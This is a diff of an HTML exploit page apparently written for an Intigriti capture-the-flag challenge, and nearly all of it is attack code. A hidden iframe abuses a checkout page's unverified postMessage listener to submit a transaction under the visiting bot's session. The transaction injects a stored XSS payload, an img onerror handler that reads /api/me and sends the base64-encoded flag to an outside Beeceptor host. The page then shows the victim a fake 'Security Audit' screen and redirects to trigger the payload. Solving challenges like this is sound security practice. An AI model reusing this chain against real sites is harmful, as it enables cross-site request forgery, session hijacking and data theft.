@@ -1,48 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Security Research - Cryptigriti</title>
+    <title>Intigriti Jan Challenge - Exploit Scout</title>
 </head>
-<body>
-    <!-- 
-        1. We load the checkout page in a hidden iframe.
-        2. We include the parameters so the page initializes correctly.
-    -->
-    <iframe 
-        id="exploitFrame" 
-        src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000" 
-        style="display:none;">
-    </iframe>
+<body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>Security Audit in Progress...</h1>
+    <p>Bypassing encryption layers... Please wait.</p>
 
     <script>
-        const targetOrigin = "https://challenge-0126.intigriti.io";
-        const iframe = document.getElementById('exploitFrame');
+        // --- CONFIG ---
+        const challenge = "https://challenge-0126.intigriti.io";
+        // REPLACE WITH YOUR BEECEPTOR URL
+        const beeceptor = "https://kavil.free.beeceptor.com";
+        
+        // --- THE PAYLOAD ---
+        // We use <img> because your local test proved it works best.
+        // It fetches the flag and sends it to you Base64 encoded.
+        const xss = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;
 
-        // When the iframe finishes loading, the bot's session is active inside it
-        iframe.onload = function() {
-            console.log("Iframe loaded, triggering cross-origin transaction...");
+        // --- THE ATTACK ---
+        const ifr = document.createElement('iframe');
+        ifr.src = `${challenge}/checkout.html?currency=1337COIN&price=1`;
+        ifr.style.display = "none";
+        document.body.appendChild(ifr);
 
-            /* 
-               The 'checkout.html' page has a listener that does not verify origin:
-               window.addEventListener('message', async function(event) { ... })
-               
-               By sending this postMessage, we tell the checkout page to execute 
-               a POST /api/transaction using the BOT'S cookies.
-            */
-            const payload = {
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: "1eb5de369cc0da5eda6b6c79baab31782e", // Your wallet address
-                    currency: "1337COIN",
-                    amount: 1
-                }
-            };
+        ifr.onload = () => {
+            setTimeout(() => {
+                // CSRF: Send the transaction command to the checkout page
+                ifr.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: xss,
+                        currency: '1337COIN',
+                        amount: 0.000001
+                    }
+                }, '*');
 
-            // Send the message to the iframe
-            iframe.contentWindow.postMessage(payload, "*");
-            
-            console.log("Payload sent to bot session.");
+                // Redirect to MarketWatch to trigger the stored XSS
+                setTimeout(() => {
+                    window.location.href = `${challenge}/marketwatch.html`;
+                }, 2000);
+            }, 1000);
         };
     </script>
 </body>
